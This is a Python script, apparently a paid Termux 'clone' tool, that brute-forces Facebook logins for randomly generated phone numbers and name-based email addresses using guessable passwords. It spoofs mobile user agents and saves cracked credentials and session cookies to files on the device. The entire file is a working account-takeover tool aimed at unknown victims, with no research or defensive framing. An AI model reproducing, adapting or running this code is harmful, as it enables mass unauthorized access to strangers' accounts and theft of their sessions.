import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ugen2=[]
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    paku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(paku2)
    
    a='Dalvik/2.1.0 (Linux; U; Android'
    b=random.randrange(6, 15)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    pakuu=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen2.append(pakuu)
cokbrut=[]
ses=requests.Session()

def cek_apk(session,coki):
    w=session.get("https://p.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')


#________________UA______________#
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua
	
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def main():
    os.system('clear')
    print(logo)
    print("  \033[1;32m║\033[1;97m1\033[1;32m║ \033[1;97mPHONE NUMBER CLONE                \033[1;32m║")
    print("  \033[1;32m║\033[1;97m2\033[1;32m║\033[1;97m GMAIL UID CLONE                   \033[1;32m║ ")
    print("  \033[1;32m║\033[1;97m0\033[1;32m║ \033[1;97mEXIT TOOL                         \033[1;32m║ ")
    linex()
    ZWE = input(f'\033[1;32m  ║\033[1;97m?\033[1;32m║ \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m  ║\033[1;97m✔\033[1;32m║\033[1;97m EXAMPLE : \033[1;32m║\033[1;97m789\033[1;32m║ ║\033[1;97m440\033[1;32m║ ║\033[1;97m670\033[1;32m║ ║\033[1;97m250\033[1;32m║ ")
    linex()
    code = input('\033[1;32m  ║\033[1;97m?\033[1;32m║\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
    linex()
    limit=int(input("\033[1;32m  ║\033[1;32m?\033[1;32m║\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=100) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'                   ')
        print(f'CHOICE CODE    '+code+'             ')
        print(f" IIf No Result ON OFF Airplane Mode")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love,code+love[:3]]
            LEE.submit(rcrack,uid,pwx,tl)

def gmail():
                os.system('rm -rf .re.txt')
                os.system('clear')
                print(logo)               
                print("\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mEXAMPLE : \033[1;32m║\033[1;97mtun\033[1;32m║ ║\033[1;97mzaw\033[1;32m║ ║\033[1;97maung\033[1;32m║ ")
                linex()
                first = input('\033[1;32m  ║\033[1;97m?\033[1;32m║ \033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mEXAMPLE : \033[1;32m║\033[1;97mlin\033[1;32m║ ║\033[1;97mhtet\033[1;32m║ ║\033[1;97mmin\033[1;32m║ ")
                linex()
                last = input('\033[1;32m  ║\033[1;97m?\033[1;32m║ \033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mEXAMPLE : \033[1;32m║\033[1;97m@gmail.com\033[1;32m║ ║\033[1;97m@yahoo.com\033[1;32m║ ")
                linex()
                domain = input('\033[1;32m  ║\033[1;97m?\033[1;32m║ \033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mEXAMPLE : \033[1;32m║\033[1;97m3000\033[1;32m║ ║\033[1;97m5000\033[1;32m║ ║\033[1;97m10000\033[1;32m║ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  ║\033[1;97m?\033[1;32m║ \033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000                
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with ThreadPool(max_workers=100) as LEE:
                        tl = str(len(fo))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mTOTAL ID       \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  ║\033[1;97m✔\033[1;32m║ \033[1;97mCRACK NAME     \033[1;32m║ \033[1;32m'+first+' '+last+'')
                        print(f"  \033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m═\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for user in fo:
                                uid,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'oo'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                pwx = [fs+ls,fs+' '+ls,fs+ls+'123',fs+ls+'12345',fs+'123',fs+'12345',fs+'1122',fs,fs+'111222',ls+'100200',ls+'12345']                                
                                LEE.submit(rcrack,uid,pwx,tl)
                
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen2)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m〘%sZWE-LAY\033[1;96m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = headers = {
            'authority': 'm.facebook.com',
            'method': 'POST',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            "user-agent":pro}
            lo = session.post('https://m.facebook.com/login/device-based/async/login/?login_attempt=1&lwv=1000',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;32m 〘OK〙  {uid} ▣ {ps}" '  \n\033[1;97m〘COOKIE〙 = \033[1;97m'+coki+  '')
                linex()
                open('/sdcard/ZWE-NOOBS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;90m 〘CP〙  {uid} ▣ {ps}")
                open('/sdcard/ZWE-NOOBS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

logo= ("""
  \033[1;32m         ▣\033[1;97m═════════\033[1;32m▣\033[1;97m══════════\033[1;32m▣
  \033[1;97m         ║ \033[1;32mWELCOME TO MY TOOL \033[1;97m║
  \033[1;32m         ▣\033[1;97m═════════\033[1;32m▣\033[1;97m══════════\033[1;32m▣
  \033[1;97m▣\033[1;32m══════════════════\033[1;97m▣\033[1;32m══════════════════\033[1;97m▣  
  \033[1;32m║\033[1;32m  ███████     ██     ██     ███████  \033[1;32m║
  \033[1;32m║   \033[1;97m  ███      ██  \033[1;32m✭\033[1;97m  ██     ██       \033[1;32m║
  \033[1;32m║  \033[1;32m  ███       ██  \033[1;97m█  \033[1;32m██     ██████   \033[1;32m║
  \033[1;32m║ \033[1;97m  ███        ██ ███ ██     ██       \033[1;32m║
  \033[1;32m║\033[1;32m  ███████      ███ ███      ███████  \033[1;32m║
  \033[1;97m▣\033[1;32m══════════════════\033[1;97m▣\033[1;32m══════════════════\033[1;97m▣ 
  \033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mEDITOR        \033[1;32m ║ \033[1;32mZWE-LAY          \033[1;32m║ 
  \033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mTELEGRAM     \033[1;32m  ║ \033[1;32mWAI-LIN-OO       \033[1;32m║
  \033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mSTATUS        \033[1;32m ║ \033[1;32mRND CLONE        \033[1;32m║  
  \033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mTOOL VERSION  \033[1;32m ║ \033[1;32m18+\033[1;32m〘PAID〙      \033[1;32m║
  \033[1;97m▣\033[1;32m══════════════════\033[1;97m▣\033[1;32m══════════════════\033[1;97m▣ """) 
def linex():
	print(f' \033[1;97m ▣\033[1;32m══════════════════\033[1;97m▣\033[1;32m══════════════════\033[1;97m▣')

main()
